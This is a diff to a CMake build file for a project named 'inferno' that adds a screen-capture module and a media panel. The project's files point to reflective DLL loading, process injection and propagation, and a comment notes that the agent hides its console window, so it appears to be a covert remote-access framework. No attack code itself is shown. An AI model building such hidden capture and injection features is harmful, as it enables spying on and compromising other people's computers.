@@ -54,6 +54,7 @@ add_executable(inferno_server
     server/src/ui/components/IntelligencePanel.cpp
     server/src/ui/components/InjectionPanel.cpp
     server/src/ui/components/PropagationPanel.cpp
+    server/src/ui/components/MediaPanel.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
     server/src/services/IntelAnalysisService.cpp
@@ -68,6 +69,7 @@ add_executable(inferno_server
     server/include/ui/components/IntelligencePanel.hpp
     server/include/ui/components/InjectionPanel.hpp
     server/include/ui/components/PropagationPanel.hpp
+    server/include/ui/components/MediaPanel.hpp
     server/include/database/Inferno_Database.hpp
     server/include/services/Analysis.hpp
     server/include/services/IntelAnalysisService.hpp
@@ -96,6 +98,7 @@ if(WIN32)
         client/src/WindowsInjector.cpp
         client/src/NtApi.cpp
         client/src/ReflectiveLoader.cpp
+        client/src/ScreenCapture.cpp
     )
 else()
     target_sources(inferno_client PRIVATE client/src/MachInjector.cpp)
@@ -112,7 +115,7 @@ endif()
 
 if(WIN32)
     target_compile_definitions(inferno_client PRIVATE _CRT_SECURE_NO_WARNINGS)
-    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32)
+    target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32 gdiplus)
     # Note: WIN32_EXECUTABLE is intentionally NOT set — the agent uses
     # FreeConsole() at runtime to hide the console window, keeping
     # standard main() as the entry point for cross-platform compatibility.
@@ -178,11 +181,12 @@ if(WIN32)
         client/src/WindowsInjector.cpp
         client/src/NtApi.cpp
         client/src/ReflectiveLoader.cpp
+        client/src/ScreenCapture.cpp
     )
     target_include_directories(inferno_agent_dll PRIVATE client/include)
     target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
     target_compile_definitions(inferno_agent_dll PRIVATE _CRT_SECURE_NO_WARNINGS)
-    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32)
+    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32 gdiplus)
     set_target_properties(inferno_agent_dll PROPERTIES
         OUTPUT_NAME "inferno_agent"
     )
@@ -255,10 +259,12 @@ if(WIN32)
         client/src/NtApi.cpp
         client/src/entry_dll.cpp
         client/src/ReflectiveLoader.cpp
+        client/src/ScreenCapture.cpp
         tests/reflective_loader_test.cpp
         tests/windows_dll_test.cpp
         tests/wire_reflective_test.cpp
         tests/embedded_dll_test.cpp
+        tests/screencapture_test.cpp
     )
 else()
     target_sources(inferno_tests PRIVATE
@@ -285,7 +291,7 @@ if(WIN32)
     target_compile_definitions(inferno_tests PRIVATE
         TEST_BINARY_DIR="$<TARGET_FILE_DIR:inferno_agent_dll>"
     )
-    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
+    target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32 gdiplus)
     target_sources(inferno_tests PRIVATE
         tests/windows_dll_test.cpp
     )
